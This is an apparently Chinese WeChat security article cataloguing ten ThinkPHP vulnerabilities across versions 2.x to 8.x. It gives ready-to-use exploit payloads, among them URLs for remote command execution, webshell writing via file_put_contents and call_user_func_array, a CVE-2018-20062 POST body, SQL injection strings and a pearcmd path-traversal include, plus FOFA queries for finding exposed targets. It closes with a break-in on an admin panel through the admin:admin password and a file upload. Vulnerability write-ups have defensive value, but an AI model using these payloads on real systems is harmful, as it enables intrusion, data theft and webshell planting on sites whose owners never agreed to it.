---
title: ThinkPHP框架：2.x-8.x全版本必须知道的10个通用漏洞（附实战getshell案例）
url: https://mp.weixin.qq.com/s/dhG4uwa_zWI_Ng_7wmt-ZQ
source: Doonsec's feed
date: 2026-09-16
fetch_date: 2026-09-17T06:55:55.434891
---

# ThinkPHP框架：2.x-8.x全版本必须知道的10个通用漏洞（附实战getshell案例）

# ThinkPHP框架：2.x-8.x全版本必须知道的10个通用漏洞（附实战getshell案例）

原创

森林之家zbs
森林之家zbs

allby森林之家

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## ThinkPHP是什么？

ThinkPHP是国内用得最多的PHP开发框架，十个PHP网站里面估摸有三四个都是ThinkPHP搭的。

但是用得多，也就代表着它的暴露面就会变大，从2.x版本到8.x版本，几乎每个大版本都出过高危漏洞，而且很多还是**直接RCE。**

## ThinkPHP站点长什么样？

ThinkPHP搭建的站点，页面右下角一般会有个长这样的标志：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBd8n3Y5xk0UoGxQzLMGPDBhKhpibqOJ4mPNpWlOn3T1pDmpicGTibej2FAyWQLr7elL5MHUd6ZIbicZqwxxXLBbC9S93ibXwUicEvibsw/640?wx_fmt=png&from=appmsg)

## ThinkPHP资产怎么找？

我推荐大家可以用FOFA搜，语句也很简单：

body="thinkphp" && title="后台管理"

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBficYGR9gp8gttrYINPBICPJzok09dFUm1vAvq7Vol2SPGgv0ffkZvGFfOocUZMN6xCHtpgefLmicOSEYYFcbVgXGSp6yxYGpMC4/640?wx_fmt=png&from=appmsg)

能搜出来一大片，打出漏洞了话后面说不定还能通杀：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBe6ianb3Deia4y4L3vQibV2s4OOsKibQWfjZvEdAkia321ZDibCXNAEU1veEibnsKYZwjx6NrdR1N4w5thicmON2P41nB2ycKJibIXjCllc/640?wx_fmt=png&from=appmsg)

还可以把ThinkPHP的icon图标保存到本地，直接用icon图标检索：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBeALml2CkicDfdib6ubOSJDB4icwT3VuPO6cCeyMuw7xjKIMZprianyf3rZlP8aibpmhzAh4iaZ53AlJCicdabXcSqT7QGUh8s8LNH4j4/640?wx_fmt=png&from=appmsg)

## 手动打之前可以先用工具跑一波nday

这里推荐一个工具：ThinkphpGUI。

去GitHub上搜ThinkphpGUI就可以下载了，支持各版本Thinkphp漏洞检测、命令执行、getshell：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBf3m05oCVibKpJxduScg2SF2dUx7HWPnRr5n21NBELdmQYnSeRerIv3SSib3bWco9wtaLvt66On1xMMmpxydF4GERacg5LibSzI4c/640?wx_fmt=png&from=appmsg)

用法也很简单，填上目标URL再点POC检测，工具就会自动匹配版本对应的漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBfUnxVc363kscdodERvWgOIKnxOibuUiceA1ciaOd6FCKy4YTrotVKauX2VCw1EL2gNewr7ov1KibEGYHiaYjFicUVJQ6PHNm7YMwYcw/640?wx_fmt=png&from=appmsg)

OK，接下来上正菜！

我把ThinkPHP各版本的通用漏洞全部都捋一遍，按版本线从2.x打头，再到8.x收尾，最后来一个文件上传getshell的实战案例。

## 漏洞一：TP2.x RCE（preg\_replace /e）

从最老的版本说起：ThinkPHP 2.x早就不维护了，但还是会有些老站还在用，漏洞原因就是2.x在解析路由时用了preg\_replace的/e模式。

这个模式会把匹配到的内容当作PHP代码执行，等于URL里写什么代码就跑什么代码。

**影响版本**：ThinkPHP 2.x、3.0（Lite模式）

▼ 漏洞1 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBe82HrjQjr4sa9fvq0cGnbE6ew4qibO2BicfPXxy6HlXVGx8Bwz8fz1SHIqEprLCQOZvZsBtwxwPibH9MSCEwRib6S2yZKCeS6vV7o/640?wx_fmt=png&from=appmsg)

查phpinfo：

/index.php?s=/index/index/xxx/${phpinfo()}

执行命令：

/index.php?s=/index/index/xxx/${system(whoami)}

写shell：

/index.php/module/action/param1/$%7B@print(eval($\_POST['1']))%7D

URL里的参数被preg\_replace拿去替换，/e模式把替换后的内容当PHP代码跑了，最后导致${}里填什么就会执行什么。

## 漏洞二：TP3.x SQL注入 + 日志泄露

ThinkPHP 3.2.4及之前版本，解析s参数、order等参数时没有严格过滤。

构造恶意参数可以进行SQL注入，跟TP5的报错注入思路类似。

报错注入payload：

/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1

updatexml报错，user()回显当前数据库用户。

更关键的是，3.1到3.2版本开启调试模式时，错误日志直接输出到前端。

数据库连接信息全暴露在上面，账号密码一览无余。

▼ 漏洞2 原理流程图

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBeEemgnGgpgnR4IwOkjuJ9hyzWIldxSKT6TxP2InDkuFIWXLT54THFsg2tnDBVOYECL8O2znj5uatJ8se7uq1mYriclsnUzJlJA/640?wx_fmt=png&from=appmsg)

3.x的老站虽然也所剩无几，但还是会有些政府站、学校站还在用的。

## 漏洞三：TP5 RCE（CVE-2018-20062）

ThinkPHP 5.0.0到5.0.23版本，Request类对method参数过滤不严。

攻击者通过POST请求伪造\_method参数，配合filter参数触发call\_user\_func回调，直接执行系统命令。

**影响版本**：ThinkPHP 5.0.0 - 5.0.23

▼ 漏洞3 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBc8OVx2x3okGPgeCJ533TjAIVFbPLYDhtV1jrlLR9ngT9QhJhggibLjsE42bGAg1gxeuxw9PRYdlAkwoQaTKfBPeUUZQ6LvcJsQ/640?wx_fmt=png&from=appmsg)

直接发包，POST请求：

POST /index.php?s=captcha HTTP/1.1

\_method=\_\_construct&filter[]=system&method=get&server[REQUEST\_METHOD]=id

filter[]=system指定回调函数，server[REQUEST\_METHOD]=id指定要执行的命令，发过去后id命令的返回结果就回来了，再把id换成whoami、cat /etc/passwd，就能实现想执行什么换什么。

**一条POST请求直接RCE**，杀伤力拉满。

## 漏洞四：TP5 RCE（invokefunction）

这个漏洞跟上面那个不是一回事，虽然都是TP5的RCE，但触发路径完全不同。

5.0.22和5.1.29等版本，对路由中的控制器名过滤不严，允许通过命名空间直接调用框架核心类的任意方法。

**影响版本**：ThinkPHP 5.0.22、5.1.29等

▼ 漏洞4 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdyA1qYC7HS4kJtt7BGzGdeNa6XLVAtrQ5I6vY0gV85UclTOt0o3M8I7MtjcAMNbLYEP2ljvKMQPtBVlR99CzMQmha0AZIlYVE/640?wx_fmt=png&from=appmsg)

执行phpinfo：

/index.php?s=/Index/\think\app/invokefunction&function=call\_user\_func\_array&vars[0]=phpinfo&vars[1][]=-1

执行系统命令：

/index.php?s=/Index/\think\app/invokefunction&function=call\_user\_func\_array&vars[0]=system&vars[1][]=pwd

写shell：

/index.php?s=/Index/\think\app/invokefunction&function=call\_user\_func\_array&vars[0]=file\_put\_contents&vars[1][]=shell.php&vars[1][]=shell内容

call\_user\_func\_array是PHP的内置函数，第一个参数是函数名，第二个是参数数组。

这里vars[0]控制函数名，vars[1]控制参数。

说白了就是**你想调什么PHP函数就能调什么**。phpinfo、system、file\_put\_contents，随便换。

写完shell就是直接蚁剑连，然后点到为止。

## 漏洞五：TP5 SQL注入 + 敏感信息泄露

ThinkPHP 5.x在处理数组参数时没做好过滤，构造恶意参数可以触发SQL报错注入。

**影响版本**：ThinkPHP 5.x

▼ 漏洞5 原理流程图

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBe5KgTTDEyAvb4Z3qamvYL0xtWuEHiakp850rc5uT1hnpCIhY2XSKuBGLnbC0nDw0REQVd4g3n9Qj6fA3Y6qR1prUykicWktPy3o/640?wx_fmt=png&from=appmsg)

更要命的是，TP5默认开启debug模式，报错页面直接把**数据库账号密码**吐出来。

报错注入payload：

/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1

updatexml报错注入，user()回显当前数据库用户。

报错页面里不仅能看到SQL错误信息，连数据库连接的账号、密码都在里面。

一个注入两个漏洞，SQL注入加上敏感信息泄露。

另外，TP5.1.x在解析order参数时也有注入点，构造恶意order参数同样能报错注入，思路一样。

## 漏洞六：TP5 文件包含RCE

ThinkPHP 5.0.0到5.0.18版本，缓存文件变量没做好过滤，导致任意文件包含。

**影响版本**：ThinkPHP 5.0.0 - 5.0.18

▼ 漏洞6 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBeGMXPK21293XyHbVas26wJCu5AtvUeUBW86wh558bHF4ib6zrKRnkffzHeEGosAmEzh4icYDNicQ3WNaZLYuibwpzNwpbEG4QFySE/640?wx_fmt=png&from=appmsg)

利用思路：通过控制缓存文件的路径，包含pearcmd.php。

借pearcmd.php的写文件能力，往web目录写一个PHP文件，实现RCE。

具体payload根据目标环境调整，核心就是**控制包含路径 + 利用pearcmd写马**。

## 漏洞七：TP6 多语言文件包含RCE（CVE-2022-47945）

ThinkPHP 6.0.13及之前版本，开启多语言功能时，通过lang参数传递恶意路径，可以穿越目录包含任意文件。

**影响版本**：ThinkPHP 6.0.13及之前

▼ 漏洞7 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBeadFmibXyor35XNPDLufcFWbDouL64kuwoXvWiajK0tbWr4CGviba8sTOF3M4TrTZ2hibkbHAEcA9rYwas64Zeviaf1l1CVkCicibDibE/640?wx_fmt=png&from=appmsg)

利用方式：

/index.php?lang=../../../../usr/local/lib/php/pearcmd.php

跟TP5的文件包含思路类似，也是结合pearcmd.php实现RCE。

前提是目标开启了多语言功能。这个功能默认关着，但不少站会开。

## 漏洞八：TP6 反序列化RCE（CVE-2022-38352）

ThinkPHP 6.0.13及之前版本，PSR6Cache组件存在反序列化漏洞。

**影响版本**：ThinkPHP 6.0.13及之前

▼ 漏洞8 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBf9icc0sSr9QoGX5XFAM06yicmOnZKHic6ojstLKZs3ZUIoaU098QJEv7wAdJww9mU9AoVe5sicZiaMOu0Uxib2GMXzm9u7lWaj6AUjQ/640?wx_fmt=png&from=appmsg)

攻击者构造恶意的反序列化数据，可以触发一条POP链最终走到call\_user\_func，实现任意方法调用。

链路大致是这样的：反序列化入口先触发\_\_destruct或\_\_wakeup，经过几个类的跳转，最终在Model类的getJsonValue方法里执行任意函数。

关键在这一行：$closure($value[$key], $value)。

$closure和$value都是可控的，等于**想调什么函数、传什么参数，全由你说了算**。

TP6自带一个SerializableClosure包，能把匿名函数也反序列化，所以不光能调system执行命令，连写马这种需要传多参数的操作也能搞定。

感兴趣的朋友可以自己跟一下这条链，细节还是有点意思的。

## 漏洞九：TP8 反序列化RCE（CVE-2024-44902）

ThinkPHP 8.0.4及之前版本，Memcached组件存在反序列化漏洞。

**影响版本**：ThinkPHP 6.1.3 - 8.0.4，跨度不小。

▼ 漏洞9 原理流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBfGPViaXHcSU8GicSLYMo0vibK0QOgBc9SMZPquACbNF0Rx515wMctUaLpK0CSib5SKicEMWCI6CGpqF4fYib18rr2ntTCMcTvbGT0oY/640?wx_fmt=png&from=appmsg)

这条链跟TP6那条有相似的地方，都是在反序列化过程中走到getJsonValue，通过控制$closure触发任意方法调用。

区别在于入口点和中间跳转的类不一样。

TP8这条是通过Manager类的\_\_call方法触发baseQuery，再经BelongsTo类跳到Model的\_\_isset，最终落到getJsonValue。

构造好POP链生成payload，触发反序列化就能RCE。

有兴趣深入研究调用链的朋友可以从\_\_call方法入手跟一下。

## 漏洞十：实战文件上传Getshell

前面九个漏洞都是框架层面的通用漏洞，这个漏洞我们直接上实战案例。

这里找到一个ThinkPHP后台管理系统，然后直接弱口令admin:admin就进去了：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBfrJlrPKpnUu3rqq1bsKhem9TUBPiaM3PpGkWQYK5YjJic4BEiaKuZib9e82AkuaSTQqIYrRdDtbODwMT5JQPWdzvc9NvutzBxQwU4/640?wx_fmt=png&from=appmsg)

进后台之后，先用FindSomething插件扫一波接口，看看有没有敏感接口：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBcg2wd0WcxJDvWLaiaI0jXYDDtARGhOiabokqpkhmBD8liah726D8q1RnwE9LqftJea9s2ZMFCemv8t6qJo4iciaN2wpYgJVtHEibqS4/640?wx_fmt=png&from=appmsg)

在议题列表的添加功能里，找到了文件上传点：

![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBewSaZDicuiad5xv2H7Yia5Ikko4ibb5K4DZwgsoTTR6zRMrb1vpygzibuicbeT0GjcicCDZCibPKJ3xhcwKic4FywzvRJyTe6UE1uOcOPc/640?wx_fmt=png&from=appmsg)

抓包发现，只点选择文件不点提交按钮，**文件也可以传上去**：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBcvbxZqm9gq2aQYhYsNA6ASibibC1H0EdfHxnJNM1lIV7HN48p74g2urfRiczWAgQJ3MJSRCkVvEQ4ELibNiay9uBw0Iibwup8QmiaRZk/640?wx_fmt=png&from=appmsg)

访问返回包里的路径，确认文件确实上传成功...